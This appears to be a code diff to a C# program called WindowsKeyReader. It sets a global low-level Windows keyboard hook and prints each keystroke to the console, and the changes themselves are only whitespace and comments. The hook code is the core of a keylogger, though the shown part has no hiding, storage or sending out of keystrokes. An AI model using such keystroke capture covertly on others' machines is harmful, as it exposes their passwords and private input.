@@ -12,16 +12,25 @@ namespace WindowsKeyReader
 {
     class Program
     {
+        
         //https://docs.microsoft.com/en-us/windows/desktop/winmsg/about-hooks
         private static int WH_KEYBOARD_LL = 13;//The WH_KEYBOARD_LL hook enables you to monitor keyboard input events about to be posted in a thread input queue.
         private static int WM_KEYDOWN = 0x0100;//https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
         private static IntPtr hook = IntPtr.Zero; //A read-only field that represents a pointer or handle that has been initialized to zero.
         private static LowLevelKeyboardProc proc = HookCallback;
+        //mouse pos
+
         static void Main(string[] args)
         {
             hook = SetHook(proc);
             Application.Run();
             UnhookWindowsHookEx(hook);
+
+
+
+
+
+
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -33,7 +42,9 @@ namespace WindowsKeyReader
                     GetModuleHandle(curModule.ModuleName), 0);
             }
         }
-        //lol
+
+
+        
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         string line ="";
@@ -79,6 +90,7 @@ namespace WindowsKeyReader
                     }
                 }
                 catch { }
+
                 ////////////////////////////////////////////////////////////////
                 Console.WriteLine((Keys)vkCode);
             }
@@ -97,5 +109,9 @@ namespace WindowsKeyReader
 
         [DllImport("kernel32.dll")]// handles memory management, input/output operations, and interrupts.
         private static extern IntPtr GetModuleHandle(String lpModuleName);
+
+ 
+
+
     }
 }
